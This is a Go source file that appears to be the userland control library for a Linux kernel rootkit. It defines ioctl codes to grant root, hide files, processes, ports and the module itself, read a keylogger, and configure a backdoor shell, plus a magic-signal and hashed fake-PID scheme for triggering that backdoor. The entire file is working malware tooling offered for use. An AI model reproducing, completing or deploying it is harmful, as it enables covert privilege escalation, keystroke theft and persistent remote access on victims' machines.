package ioctl

import (
	"syscall"
	"unsafe"
)

// Standard Linux ioctl command layout (uapi/asm-generic/ioctl.h):
//   bits 31:30 = direction  (0=none, 1=write, 2=read)
//   bits 29:16 = argument size
//   bits 15:8  = type (magic number)
//   bits 7:0   = command number

const magic = 0xC0

func _IOC(dir, typ, nr, size uintptr) uintptr {
	return (dir << 30) | (size << 16) | (typ << 8) | nr
}
func _IO(typ, nr uintptr) uintptr        { return _IOC(0, typ, nr, 0) }
func _IOW(typ, nr, size uintptr) uintptr { return _IOC(1, typ, nr, size) }
func _IOR(typ, nr, size uintptr) uintptr { return _IOC(2, typ, nr, size) }

var (
	IOCTL_GIVE_ROOT      = _IO(magic, 0x01)        // 0xC001
	IOCTL_HIDE_FILE      = _IOW(magic, 0x02, 256)  // 0x4100C002
	IOCTL_UNHIDE_FILE    = _IOW(magic, 0x03, 256)  // 0x4100C003
	IOCTL_HIDE_PID       = _IOW(magic, 0x04, 4)    // 0x4004C004
	IOCTL_UNHIDE_PID     = _IOW(magic, 0x05, 4)    // 0x4004C005
	IOCTL_HIDE_PORT      = _IOW(magic, 0x06, 2)    // 0x4002C006
	IOCTL_UNHIDE_PORT    = _IOW(magic, 0x07, 2)    // 0x4002C007
	IOCTL_LIST_HIDDEN    = _IOR(magic, 0x08, 4096) // 0x9000C008
	IOCTL_KEYLOG_READ    = _IOR(magic, 0x09, 4096) // 0x9000C009
	IOCTL_KEYLOG_CLEAR   = _IO(magic, 0x0A)        // 0xC00A
	IOCTL_BACKDOOR_SHELL = _IOW(magic, 0x0B, 256)  // 0x4100C00B
	IOCTL_BACKDOOR_MAGIC = _IOW(magic, 0x0C, 16)   // 0x4010C00C
	IOCTL_MODULE_HIDE    = _IO(magic, 0x0D)        // 0xC00D
	IOCTL_MODULE_UNHIDE  = _IO(magic, 0x0E)        // 0xC00E
	IOCTL_GET_STATS      = _IOR(magic, 0x0F, 4096) // 0x9000C00F
)

// MagicSignal is the real-time signal the backdoor listens for.
// glibc SIGRTMIN is 34 on x86_64, so SIGRTMIN+1 == 35 as passed to
// kill(2). It must match MAGIC_SIGNAL in src/backdoor.c.
const MagicSignal = 35

// FNV1a16 hashes a string with 32-bit FNV-1a and folds the result
// to 16 bits. It MUST stay in sync with vault_fnv1a16() in
// src/backdoor.c.
func FNV1a16(s string) uint16 {
	const (
		offset32 = 0x811C9DC5
		prime32  = 0x01000193
	)
	h := uint32(offset32)
	for i := 0; i < len(s); i++ {
		h ^= uint32(s[i])
		h *= prime32
	}
	return uint16(h>>16) ^ uint16(h&0xFFFF)
}

// MagicPID encodes a port and a magic word into the fake PID value
// consumed by backdoor_check_magic(): (port << 16) | hash(word).
func MagicPID(word string, port uint16) uint32 {
	return uint32(port)<<16 | uint32(FNV1a16(word))
}

func Raw(fd uintptr, cmd uintptr, arg unsafe.Pointer) (uintptr, syscall.Errno) {
	r, _, err := syscall.Syscall(syscall.SYS_IOCTL, fd, cmd, uintptr(arg))
	return r, err
}
